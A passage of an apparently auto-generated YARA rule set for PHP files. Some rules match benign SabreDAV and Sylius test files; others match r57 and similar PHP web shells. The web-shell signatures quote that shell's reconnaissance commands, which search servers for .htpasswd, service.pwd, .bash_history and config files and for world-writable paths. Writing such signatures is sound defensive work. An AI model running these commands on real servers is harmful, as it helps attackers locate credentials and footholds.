      hash2 = "ffc4d52907cffeee798c34f5b3ff9fe7726490c55a61faa8b8db482ac4b1e71a"
   strings:
      $s1 = "$this->assertEquals(['mailto:user1.sabredav@sabredav.org', '/principals/user1/'], $prop->getHrefs());" fullword ascii
      $s2 = "$props = $this->server->getPropertiesForPath('/principals/user1', [" fullword ascii
      $s3 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}calendar-user-address-set', $props[0][200]);" fullword ascii
      $s4 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}calendar-user-type', $props[0][200]);" fullword ascii
      $s5 = "$this->assertEquals('calendars/user1/outbox/', $prop->getHref());" fullword ascii
      $s6 = "$this->assertEquals('calendars/user1/inbox/', $prop->getHref());" fullword ascii
      $s7 = "$this->assertEquals('calendars/user1/default/', $prop->getHref());" fullword ascii
      $s8 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-default-calendar-URL', $props[0][200]);" fullword ascii
      $s9 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}calendar-user-address-set'];" fullword ascii
      $s10 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-outbox-URL', $props[0][200]);" fullword ascii
      $s11 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-inbox-URL', $props[0][200]);" fullword ascii
      $s12 = "'{urn:ietf:params:xml:ns:caldav}calendar-user-address-set'," fullword ascii
      $s13 = "$this->assertArrayHasKey(200, $props[0]);" fullword ascii
      $s14 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}calendar-user-type'];" fullword ascii
      $s15 = "$this->assertArrayHasKey(0, $props);" fullword ascii
      $s16 = "$this->assertTrue($prop instanceof DAV\\Xml\\Property\\Href);" fullword ascii
      $s17 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}schedule-default-calendar-URL'];" fullword ascii
      $s18 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}schedule-outbox-URL'];" fullword ascii
      $s19 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}schedule-inbox-URL'];" fullword ascii
      $s20 = "$this->assertEquals('INDIVIDUAL', $prop);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _OrderItemUnitSpec_OrderSpec_65
{
   meta:
      description = "php22 - from files OrderItemUnitSpec.php, OrderSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "accb0c9e503bfdadc8f135cabd747019e8896ce5df7ff1e853de37aa172ad6f6"
      hash2 = "541036562c09552cccefb160982e486b04a8ea89fffeb54646837900d72a3d35"
   strings:
      $s1 = "use Sylius\\Component\\Order\\Model\\AdjustmentInterface;" fullword ascii
      $s2 = "$this->getTotal()->shouldReturn(0);" fullword ascii
      $s3 = "namespace spec\\Sylius\\Component\\Order\\Model;" fullword ascii
      $s4 = "$this->hasAdjustment($adjustment)->shouldReturn(true);" fullword ascii
      $s5 = "$this->hasAdjustment($adjustment)->shouldReturn(false);" fullword ascii
      $s6 = "$adjustment2->isNeutral()->willReturn(false);" fullword ascii
      $s7 = "$adjustment1->isLocked()->willReturn(false);" fullword ascii
      $s8 = "$adjustment->isNeutral()->willReturn(false);" fullword ascii
      $s9 = "$adjustment->isLocked()->willReturn(false);" fullword ascii
      $s10 = "$adjustment->isNeutral()->willReturn(true);" fullword ascii
      $s11 = "$adjustment1->isNeutral()->willReturn(false);" fullword ascii
      $s12 = "$adjustment3->isNeutral()->willReturn(false);" fullword ascii
      $s13 = "$this->addAdjustment($adjustment);" fullword ascii
      $s14 = "$this->removeAdjustment($adjustment);" fullword ascii
      $s15 = "$this->addAdjustment($adjustment2);" fullword ascii
      $s16 = "$this->addAdjustment($adjustment3);" fullword ascii
      $s17 = "$this->removeAdjustment($adjustment1);" fullword ascii
      $s18 = "$this->addAdjustment($adjustment1);" fullword ascii
      $s19 = "AdjustmentInterface $adjustment2," fullword ascii
      $s20 = "AdjustmentInterface $adjustment1," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

rule _oi_php_decode_onlineexpnokill_p0isoN_sh3ll_r57_biz_Dq99Shell_66
{
   meta:
      description = "php22 - from files oi.php.decode.php, onlineexpnokill.php, p0isoN.sh3ll.php, r57.biz_Dq99Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9978ea2bdfbadad460a3871b5a357cc25342820808536cb3fb652f2324df2dfb"
      hash2 = "09e233736cc15529fb8e0c711ef3adba86da6eeb8a298790af57f9701a2d9a67"
      hash3 = "16623a1a16ede2b5c5dea7a7ff0b32516a970915564461842e003133cb3046d3"
      hash4 = "80750b669b03b8ee93e0591222c940cb875a3feadf7f7aedda0e56f68fb6b240"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAD" ascii
      $s3 = "\"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s4 = "\"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz\"." fullword ascii
      $s5 = "\"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ\"." fullword ascii
      $s6 = "\"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7\"." fullword ascii
      $s7 = "\"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs\"." fullword ascii
      $s8 = "\"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc\"." fullword ascii
      $s9 = "\"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx\"." fullword ascii
      $s10 = "\"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7\"." fullword ascii
      $s11 = "\"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt\"." fullword ascii
      $s12 = "\"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk\"." fullword ascii
      $s13 = "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci\"." fullword ascii
      $s14 = "\"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA\"." fullword ascii
      $s15 = "\"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA\"." fullword ascii
      $s16 = "\"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH\"." fullword ascii
      $s17 = "\"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU\"." fullword ascii
      $s18 = "\"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P\"." fullword ascii
      $s19 = "\"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd\"." fullword ascii
      $s20 = "\"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ\"." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57__15__r57_r577_r57shell_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0_67
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57 (15).php, r57.php, r577.php, r57shell.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash3 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash4 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash5 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash6 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash7 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash8 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash9 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash10 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash11 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash12 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash13 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash14 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
      hash15 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php'," fullword ascii
      $s2 = "'find config* files in current dir'=>'find . -type f -name \"config*\"'," fullword ascii
      $s3 = "'find service.pwd files in current dir'=>'find . -type f -name service.pwd'," fullword ascii
      $s4 = "'find config.inc.php files'=>'find / -type f -name config.inc.php'," fullword ascii
      $s5 = "'find config* files'=>'find / -type f -name \"config*\"'," fullword ascii
      $s6 = "'find all service.pwd files'=>'find / -type f -name service.pwd'," fullword ascii
      $s7 = "'show opened ports'=>'netstat -an | grep -i listen'," fullword ascii
      $s8 = "if(version_compare(phpversion(), '4.1.0') == -1)" fullword ascii
      $s9 = "'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd'," fullword ascii
      $s10 = "'list file attributes on a Linux second extended file system'=>'lsattr -va'," fullword ascii
      $s11 = "'find all .htpasswd files'=>'find / -type f -name .htpasswd'," fullword ascii
      $s12 = "'find .bash_history files in current dir'=>'find . -type f -name .bash_history'," fullword ascii
      $s13 = "'find all writable directories and files in current dir'=>'find . -perm -2 -ls'," fullword ascii
      $s14 = "'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc'," fullword ascii
      $s15 = "'find all writable directories in current dir'=>'find . -type d -perm -2 -ls'," fullword ascii
      $s16 = "'find all writable files in current dir'=>'find . -type f -perm -2 -ls'," fullword ascii
      $s17 = "'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc'," fullword ascii
      $s18 = "'find all .bash_history files'=>'find / -type f -name .bash_history'," fullword ascii
      $s19 = "'find all writable directories and files'=>'find / -perm -2 -ls'," fullword ascii
      $s20 = "'find all writable directories'=>'find /  -type d -perm -2 -ls'," fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

